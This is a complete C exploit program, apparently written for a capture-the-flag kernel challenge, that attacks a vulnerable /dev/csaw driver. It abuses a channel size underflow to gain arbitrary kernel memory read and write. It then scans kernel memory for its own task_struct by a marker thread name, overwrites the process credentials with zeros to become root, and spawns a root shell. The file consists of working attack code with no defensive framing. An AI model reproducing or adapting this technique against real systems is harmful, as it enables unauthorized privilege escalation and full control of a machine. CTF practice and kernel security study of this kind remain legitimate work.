/*************************************************************
 * File Name: exp_task_struct.c
 * 
 * Created on: 2019-10-15 04:30:15
 * Author: raycp
 * 
 * Last Modified: 2019-10-23 07:06:51
 * Description: privilege escalate by revise cred
************************************************************/
#include<stdio.h>
#include<stdlib.h>
#include<inttypes.h>
#include<sys/types.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <unistd.h>

#include <string.h>


#define DEV_NAME  "/dev/csaw"

#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8

void die(const char* msg)
{
    perror(msg);
    exit(-1);
            
}


struct alloc_channel_args {
    size_t buf_size;
    int id;
};

struct open_channel_args {
    int id;
};

struct grow_channel_args {
    int id;
    size_t size;
};

struct shrink_channel_args {
    int id;
    size_t size;
};

struct read_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct write_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct seek_channel_args {
    int id;
    loff_t index;
    int whence;
};

struct close_channel_args {
    int id;
};

void arbitrary_read(int fd, int channel_id, void *read_buff, uint64_t addr, uint32_t len)
{

    struct seek_channel_args seek_channel;
    struct read_channel_args read_channel;

    seek_channel.id = channel_id;
    seek_channel.index = addr-0x10;
    seek_channel.whence = SEEK_SET;
    ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);

    read_channel.id = channel_id;
    read_channel.buf = (char*)read_buff;
    read_channel.count = len;
    ioctl(fd, CSAW_READ_CHANNEL, &read_channel);

    return ;
}

void arbitrary_write(int fd, int channel_id, void* write_buff, uint64_t addr, uint32_t len)
{

    struct seek_channel_args seek_channel;
    struct write_channel_args write_channel;
    uint32_t i;
    for (i=0; i<len; i++){

        seek_channel.id = channel_id;
        seek_channel.index = addr-0x10+i;
        seek_channel.whence = SEEK_SET;
        ioctl(fd, CSAW_SEEK_CHANNEL, &seek_channel);

        write_channel.id = channel_id;
        write_channel.buf = (char*)(write_buff)+i;
        write_channel.count = 1;
        ioctl(fd, CSAW_WRITE_CHANNEL, &write_channel);
    }
}

int main()
{
    int fd, channel_id;
    struct alloc_channel_args alloc_channel;
    struct shrink_channel_args shrink_channel;
    uint64_t addr;
    uint8_t* find_ptr;
    uint8_t read_buff[0x1000];
    uint64_t cred_ptr;
    uint64_t real_cred_ptr;
    uint32_t i;
    uint32_t root_cred[8] ={0};

    // step 1 set thread name by prctl.
    printf("[+] set thread name\n");
    char thread_name[20] ;
    strcpy(thread_name,"evilthread_name");
    prctl(PR_SET_NAME, thread_name);
    
    printf("[+] open /dev/csaw\n");
    fd = open(DEV_NAME, O_RDWR);
    
    if(fd == -1)
        die("open dev error");

    // step 2 create the channel which we can arbitrary read and write
    alloc_channel.buf_size = 0x100;
    alloc_channel.id = -1;
    ioctl(fd, CSAW_ALLOC_CHANNEL, &alloc_channel);
    
    if(alloc_channel.id == -1 )
        die("alloc channel error");
    
    channel_id = alloc_channel.id;

    shrink_channel.id = channel_id;
    shrink_channel.size = 0x100 + 1;
    ioctl(fd, CSAW_SHRINK_CHANNEL, &shrink_channel);

    printf("[+] right now, have the ability of arbitrary read write\n");

    // step 3 trying to find task struct
    for(addr=0xffff880000000000; addr<0xffffc80000000000; addr+=0x1000) {
        arbitrary_read(fd, channel_id, read_buff, addr, 0x1000);
        find_ptr = memmem(read_buff, 0x1000, thread_name, 16);

        if(find_ptr) {
            //printf("find:%lp  %lp\n",read_buff, find_ptr);
            //printf("%s\n",find_ptr);
            cred_ptr = *(uint64_t*)(find_ptr-8);
            real_cred_ptr = *(uint64_t*)(find_ptr-0x10);
            if((cred_ptr&0xff00000000000000) && (real_cred_ptr == cred_ptr)) {
                printf("[+] &(task_struct.cred) addr: %lp\n", addr+(find_ptr-read_buff));
                printf("[+] cred found at: %lp\n", real_cred_ptr);
                break;
            }
        }


    }

    if(find_ptr==0) {
        die("[-] can't find cred");
    }
    
    //step 4 revise the cred to achieve privilege escalating
    arbitrary_write(fd, channel_id, root_cred, cred_ptr, 28);
    printf("[+] right now uid: %d\n",getuid());

    //step 5 launch root shell to do anything.
    if (getuid() == 0){
        printf("[+] launch root shell...\n");
        system("/bin/sh");
                            
    }
    else{
        die("privilege escalate failed");
                            
    }

    return 0;


}

